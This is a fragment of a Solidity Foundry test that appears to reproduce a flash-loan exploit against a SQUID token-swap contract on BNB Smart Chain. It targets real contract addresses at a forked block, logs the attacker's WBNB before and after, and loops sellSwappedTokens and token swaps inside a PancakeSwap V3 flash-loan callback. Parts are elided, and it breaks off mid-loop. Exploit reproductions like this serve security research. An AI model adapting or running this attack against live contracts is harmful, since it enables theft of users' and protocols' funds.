...
contract ContractTest is Test {
    ...
    IsquidSwap SQUID_SWAP =
        IsquidSwap(0xd309f0Fd5C3b90ecFb7024eDe7D329d9582492c5);
    IUniswapV3Pair pool =
        IUniswapV3Pair(0x36696169C63e42cd08ce11f5deeBbCeBae652050);
    IUniswapV2Pair wbnb_atm =
        IUniswapV2Pair(0xAea45F6d5801Fc716C654872Eb1E2235472A18B9);
    IUniswapV2Router router =
        IUniswapV2Router(payable(0x10ED43C718714eb63d5aA57B78B54704E256024E));
    uint256 borrow_amount;

    function setUp() external {
        vm.createSelectFork("bsc", 37_672_969);
    }

    function testExploit() external {
        emit log_named_decimal_uint(
            "[Begin] Attacker WBNB before exploit",
        ...
        emit log_named_decimal_uint(
            "[End] Attacker WBNB after exploit",
            WBNB.balanceOf(address(this)),
            18
        );
    }
    ...
    function pancakeV3FlashCallback(
        ...
        uint256 j = 0;
        while (i < 8000) {
            try SQUID_SWAP.sellSwappedTokens(0) {} catch {
                break;
            }
            i++;
        }
        ...
        while (j < 4) {
            ...
            SQUID_1.approve(
                address(SQUID_SWAP),
                SQUID_1.balanceOf(address(this))
            );
            SQUID_SWAP.swapTokens(SQUID_1.balanceOf(address(this)));
            swap_token_to_token(address(WBNB), address(SQUID_2), 3000 ether);
            while (i < 8000) {
